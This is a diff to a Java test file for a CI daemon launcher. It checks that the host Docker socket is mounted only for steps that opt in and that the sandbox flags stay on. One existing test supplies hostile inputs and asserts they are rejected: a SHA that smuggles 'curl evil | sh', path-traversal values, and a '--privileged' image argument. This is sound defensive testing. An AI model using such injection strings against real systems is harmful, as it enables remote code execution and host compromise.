@@ -30,6 +30,9 @@ public class CiDaemonLauncherTest {
     launcher.memoryLimit = "4g";
     launcher.pidsLimit = "2048";
     launcher.cpus = "2";
+    launcher.dockerSocketPath = "/var/run/docker.sock";
+    launcher.artifactsRegistryHost = "qits-artifacts:8080";
+    launcher.artifactsImageRepository = "qits";
     return launcher;
   }
 
@@ -43,7 +46,23 @@ public class CiDaemonLauncherTest {
           "maven:3.9",
           "daemon-7",
           "s3cr3t",
-          "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef");
+          "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef",
+          false);
+
+  /** The same step, having declared {@code docker: true} — the only difference anywhere. */
+  private LaunchSpec publishing() {
+    return new LaunchSpec(
+        spec.runId(),
+        spec.stepIndex(),
+        spec.repoId(),
+        spec.branch(),
+        spec.sha(),
+        spec.image(),
+        spec.daemonId(),
+        spec.secret(),
+        spec.daemonBinaryUrl(),
+        true);
+  }
 
   @Test
   public void buildsTheDetachedDockerRunArgv() {
@@ -89,12 +108,63 @@ public class CiDaemonLauncherTest {
             "CI=true",
             "--env",
             "QITS_CI=true",
+            "--env",
+            "QITS_REGISTRY=qits-artifacts:8080",
+            "--env",
+            "QITS_IMAGE_REPOSITORY=qits",
             "--entrypoint",
             "/bin/sh",
             "maven:3.9",
             "-c",
             CiDaemonLauncher.BOOTSTRAP),
         launcher().buildArgv(spec));
+  }
+
+  @Test
+  public void aStepThatDeclaredDockerGetsTheHostSocketAndOnlyThat() {
+    List<String> plain = launcher().buildArgv(spec);
+    List<String> withDocker = launcher().buildArgv(publishing());
+
+    // The mount is there, at the same path on both sides so the step image's CLI finds it by default.
+    int mount = withDocker.indexOf("-v");
+    assertTrue(mount >= 0, withDocker.toString());
+    assertEquals("/var/run/docker.sock:/var/run/docker.sock", withDocker.get(mount + 1));
+
+    // And it is the ONLY difference: the sandbox does not relax for a publish step, because cap-drop
+    // and no-new-privileges cost a socket client nothing and keeping them unconditional is what keeps
+    // them meaning something for the steps that never opt in.
+    List<String> withoutTheMount = new java.util.ArrayList<>(withDocker);
+    withoutTheMount.subList(mount, mount + 2).clear();
+    assertEquals(plain, withoutTheMount, "declaring docker must add a mount and change nothing else");
+    assertTrue(withDocker.contains("--cap-drop=ALL"), withDocker.toString());
+    assertTrue(withDocker.contains("--security-opt=no-new-privileges"), withDocker.toString());
+  }
+
+  @Test
+  public void aStepThatDeclaredNothingGetsNoDockerSocketAtAll() {
+    // THIS is the security assertion of the pair — the absence, not the presence. A step's script is
+    // repo-controlled code and the docker socket is root on the host, so "no socket unless the config
+    // said so" is the invariant, and an accidental unconditional mount would be invisible everywhere
+    // else in this repository until it was invisible in production.
+    List<String> argv = launcher().buildArgv(spec);
+    assertFalse(argv.contains("-v"), argv.toString());
+    assertFalse(argv.contains("--volume"), argv.toString());
+    for (String arg : argv) {
+      assertFalse(arg.contains("docker.sock"), "no step may see a docker socket it did not ask for: " + arg);
+    }
+  }
+
+  @Test
+  public void everyStepIsToldWhereAPublishedImageGoes() {
+    // Injected unconditionally, opted in or not: "which registry" must never be a literal in a
+    // repository's pipeline. With $QITS_CI_SHA these two are the whole tag convention qits-cd pulls
+    // by, and they are named after their owner because qits-cd ships the same pair.
+    for (LaunchSpec each : List.of(spec, publishing())) {
+      List<String> argv = launcher().buildArgv(each);
+      assertTrue(argv.contains("QITS_REGISTRY=qits-artifacts:8080"), argv.toString());
+      assertTrue(argv.contains("QITS_IMAGE_REPOSITORY=qits"), argv.toString());
+      assertTrue(argv.contains("QITS_CI_SHA=cafebabe"), argv.toString());
+    }
   }
 
   @Test
@@ -153,23 +223,23 @@ public class CiDaemonLauncherTest {
   public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u");
+        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false);
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u");
+        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false);
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u");
+        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false);
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
     // The image is repo-declared rather than intake-supplied, and it is a positional argument to the
     // docker CLI. Nothing is known to get through it — ProcessBuilder does not shell-split and the
     // trailing `-c <BOOTSTRAP>` defeats the obvious re-parses — but an argument that can be read as
     // an option is not a thing to leave to the parser's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u");
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false);
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u");
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false);
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
